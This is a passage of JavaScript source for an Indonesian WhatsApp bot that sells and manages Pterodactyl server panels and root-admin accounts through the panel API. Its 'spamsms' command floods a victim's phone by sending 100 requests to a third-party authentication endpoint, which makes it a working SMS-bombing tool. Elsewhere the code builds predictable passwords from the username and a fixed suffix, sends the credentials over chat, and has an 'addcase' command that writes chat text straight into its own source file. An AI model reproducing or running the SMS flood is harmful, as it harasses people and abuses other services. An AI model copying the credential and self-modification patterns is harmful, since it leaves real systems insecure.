if (!isPremium2 && !isOwner) return reply(mess.only.premium2)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "11GB"
let egg = global.eggsnya
let loc = global.location
let memo = "11240"
let cpu = "280"
let disk = "11240"
let email = username + "@buyer.kira.id"
akunlo = "https://telegra.ph/file/9131e98d6a9a81a3f2dd6.jpg" 
if (!u) return
let d = (await tamzz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "7ujs8d"
let f = await fetch(domain2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain2 + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain2}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4.NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE TERIMAKASIH
=====================================
`
tamzz.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: tamzz.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": "Buyer K I R A",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
break
case "buyadmin": {
if (cekSaldo(sender, db_saldo) == 0) return reply(`Saldo Anda Kurang, Nominal Admin Panel 15.000\n\nSilahkan Deposit Terlebih Dahulu`)
if (cekSaldo(sender, db_saldo) < 15000 && cekSaldo(sender, db_saldo) !== 0) return reply(`Saldo Anda Kurang, Nominal Admin Panel 15.000\n\nSilahkan Deposit Terlebih Dahulu`)
let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let password = username + "gyb7gxri1w"
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})

})

let data = await f.json();

if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

let user = data.attributes

let tks = `
TYPE: user

📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${user.created_at}

🖥️LOGIN: Rahasia 🤫🧏
`
    const listMessage = {

        text: tks,

    }

	

    await tamzz.sendMessage(m.chat, listMessage)

    await tamzz.sendMessage(nomornya, {

        text: `BERIKUT DETAIL AKUN ADMIN  PANEL ANDA✌️👊 ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏\n
🌐LOGIN : ${domain}
👤USERNAME : ${username}
🔐PASSWORD : ${password}
==============================
⚠️ RULES ADMIN PANEL:
• Dilarang Keras Pasang Sc Ddos
• Dilarang Ddos Server
• Dilarang Nyuri Script
• Dilarang Otak Atik Server Lain
• Kalo Jualan Panel Sensor Link Webnya
• Dilarang Bagi² Panel Secara Free
• Dilarang Jualan Admin Panel Kecuali PT PANEL !!!

NGEYEL? KICK DELL USR+NO REFF.
Jangan Lupa Bilang Done Yaa Beb 😑
==============================
THANKS FOR BUYING 😁✌️`,

    })
minSaldo(sender, Number(15000), db_saldo)
} 
        break
case "listadmin2": {
  if (!isOwner) return reply(`Maaf, Anda tidak dapat melihat daftar pengguna.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain2 + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey2
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list admin:\n\n";

  for (let user of users) {
    let u = user.attributes;
    if (u.root_admin) {
      messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
      messageText += `${u.username}\n`;
      messageText += `${u.first_name} ${u.last_name}\n\n`;
    }
  }

  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Admin: ${res.meta.pagination.count}`;

  await tamzz.sendMessage(m.chat, { text: messageText }, { quoted: qpayment });

  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    m.reply(`Gunakan perintah ${prefix}listadmin2 ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break
case "delsrv2": {
      if (!isOwner) return reply(`KHUSUS OWN `)

let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain2 + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND❌*')
reply('*SUCCESSFULLY DELETE THE SERVER✅*')
}
        break
case "delusr2": {
  if (!isOwner) return reply(`KHUSUS OWNER🤪`)
let usr = args[0]
if (!usr) return reply('ID nya mana?')
let f = await fetch(domain2 + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*USER NOT FOUND❌*')
reply('*SUCCESSFULLY DELETE THE USER✅*')
}
break
case "listusr": {
  if (!isOwner) return reply(mess.only.owner)
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let users = res.data;
  
  messageText = `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  totalUsr = `Total Users: ${res.meta.pagination.count}`;
  
  tamzz.sendList(m.chat, messageText, "Powered By MikkuBot ", {
                    title: totalUsr, sections: [{
                        title: "List Users Panel",
                        rows: users.map(a => ({
                                title: `ID: ${a.attributes.id} - Status: ${a.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}`,
                                description: a.attributes.username,
                                id: `.detusr ${a.attributes.id}`
                        }))
                    }]
                })
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
case "addadmin": {
if (!isOwner) return reply(`*KHUSUS ϝαԃȥʋρɳ 👑*`)
let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let password = username + "gyb7gxri1w"
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})

})

let data = await f.json();

if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

let user = data.attributes

let tks = `
TYPE: user

📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${user.created_at}

🖥️LOGIN: Rahasia 🤫🧏
`
    const listMessage = {

        text: tks,

    }

	

    await tamzz.sendMessage(m.chat, listMessage)

    await tamzz.sendMessage(nomornya, {

        text: `BERIKUT DETAIL AKUN ADMIN  PANEL ANDA✌️👊 ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏\n
🌐LOGIN : ${domain}
👤USERNAME : ${username}
🔐PASSWORD : ${password}
==============================
⚠️ RULES ADMIN PANEL:
• Dilarang Keras Pasang Sc Ddos
• Dilarang Ddos Server
• Dilarang Nyuri Script
• Dilarang Otak Atik Server Lain
• Kalo Jualan Panel Sensor Link Webnya
• Dilarang Bagi² Panel Secara Free
• Dilarang Jualan Admin Panel Kecuali PT PANEL !!!

NGEYEL? KICK DELL USR+NO REFF.
Jangan Lupa Bilang Done Yaa Beb 😑
==============================
THANKS FOR BUYING 😁✌️`,

    })

} 
        break
        case "listadmin": {
  if (!isOwner) return reply(`Maaf, Anda tidak dapat melihat daftar pengguna.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list admin:\n\n";

  for (let user of users) {
    let u = user.attributes;
    if (u.root_admin) {
      messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
      messageText += `${u.username}\n`;
      messageText += `${u.first_name} ${u.last_name}\n\n`;
    }
  }

  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Admin: ${res.meta.pagination.count}`;

  await tamzz.sendMessage(m.chat, { text: messageText }, { quoted: qpayment });

  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    m.reply(`Gunakan perintah ${prefix}listadmin ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break
case 'addcase': {
 if (!isOwner) return reply('lu sapa asu')
 if (!text) return reply('Mana case nya');
    const fs = require('fs');
const namaFile = 'MikkuBot.js';
const caseBaru = `${text}`;
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('Terjadi kesalahan saat membaca file:', err);
        return;
    }
    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                reply('Terjadi kesalahan saat menulis file:', err);
            } else {
                reply('Case baru berhasil ditambahkan.');
            }
        });
    } else {
        reply('Tidak dapat menambahkan case dalam file.');
    }
});

}
break
case 'backup':
        {
          if (!isOwner) return reply(mess.only.owner)
     await reply("Sabar Mas Lagi Backup!!!");
          const { execSync } = require("child_process");
          const ls = (await execSync("ls"))
            .toString()
            .split("\n")
            .filter(
              (pe) =>
                pe != "node_modules" &&
                pe != "session" &&
                pe != "package-lock.json" &&
                pe != "yarn.lock" &&
                pe != ""
            );
          const exec = await execSync(`zip -r TAMZ - CPANEL.zip ${ls.join(" ")}`);
          await tamzz.sendMessage(
            m.chat,
            {
              document: await fs.readFileSync("./TAMZ - CPANEL.zip"),
              mimetype: "application/zip",
              fileName: "ᴛᴀᴍᴢ - ᴄᴘᴀɴᴇʟ ⚡.zip",
            },
            { quoted: kalgans }
          );
          await execSync("rm -rf TAMZ - CPANEL.zip");
        }
        break
case "listusr2": {
  if (!isOwner) return reply(mess.only.owner)
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain2 + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey2
    }
  });
  let res = await f.json();
  let users = res.data;
  
  messageText = `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  totalUsr = `Total Users: ${res.meta.pagination.count}`;
  
  tamzz.sendList(m.chat, messageText, "Powered By MikkuBot ", {
                    title: totalUsr, sections: [{
                        title: "List Users Panel",
                        rows: users.map(a => ({
                                title: `ID: ${a.attributes.id} - Status: ${a.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}`,
                                description: a.attributes.username,
                                id: `.detusr2 ${a.attributes.id}`
                        }))
                    }]
                })
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listusr2 ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
case 'spamsms': {
if (!isOwner) return m.reply('*khusus Premium*')
const froms = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (m.quoted || text) {
if (froms.startsWith('08')) return m.reply('Awali nomor dengan +62')
if (froms == owner) return m.reply('Tidak bisa spam ke nomor ini!')
let nosms = '+' + froms.replace('@s.whatsapp.net', '')
let mal = ["Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7108827108815046027 t6205049005192687891", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1692361810532096513 t9071033982482470646", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4466439914708508420 t8068951106021062059", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8880767681151577953 t8052286838287810618", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6215776200348075665 t6662866128547677118", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1588190262877692089 t2919217341348717815", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5330150654511677032 t9071033982482470646", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36"]
let ua = mal[Math.floor(Math.random() * mal.length)];
let axios = require('axios').default;
let hd = {
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
};
const dat = {
'phone': nosms
};
for (let x = 0; x < 100; x++) {
axios.post('https://api.myfave.com/api/fave/v1/auth', dat, {
headers: hd
}).then(res => {
console.log(res);
}).catch(err => {
console.log(`[${new Date().toLocaleTimeString()}] Spam (SMS) BY TAMZDEV`);
});
}
} else m.reply(`Penggunaan spamsms nomor/reply pesan target*\nContoh spamsms +6281214281312`)
m.reply(`spam sms/call akan di kirim ke no target`)
}
break
case 'clone': case 'clonegc': {
if (!isOwner) return reply(mess.only.owner)
if (!m.isGroup) return reply(mess.only.group)
if (!text) return reply(`Contoh : ${prefix+command} nama grup`)
let nameGroup = `${text}`
try {
await tamzz.sendMessage(from, { text: `*Cloning Group Dan Semua Member Start*`, }, { quoted: kalgans });
const group = await tamzz.groupCreate( `${nameGroup}`, groupparticipants);
await tamzz.groupSettingUpdate(group.id, "locked");
await tamzz.sendMessage(group.id, { text: `*Hallo Selamat datang semua di Ggroupparticipantsroup ${nameGroup}*`});
await tamzz.groupSettingUpdate(group.id, "not_announcement");
reply(`Succes Clone Grup\nNama Grup : ${nameGroup}`)
} catch (err) {
reply(`Gagal Clone Grup : ${err.message}`)
}
}
break
case 'linklogin': case 'linklog':{
let teksmenu = `${domain}`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender] 
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksmenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: "*Click Button Di Bawah👇*"
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Login\",\"url\":\"${domain}\",\"merchant_url\":\"https://www.google.com\"}`
}]
}) 
})} 
}}, {userJid: m.sender, quoted: qpayment}) 
await tamzz.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case 'bcgc': case 'bcgroup': {
if (!isOwner) return reply(mess.only.owner)
if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
let getGroups = await tamzz.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(1500)
tamzz.sendMessage(i, {text: `${text}`}, {quoted:kalgans})
    }
reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break
case 'reinstall2': {
if (!isOwner) return reply(mess.only.owner)
let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain2 + "/api/application/servers/" + srv + "/reinstall", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*REINSTALLING THE SERVER..*')
}
break


case 'reinstall': {
if (!isOwner) return reply(mess.owner)
let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv + "/reinstall", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
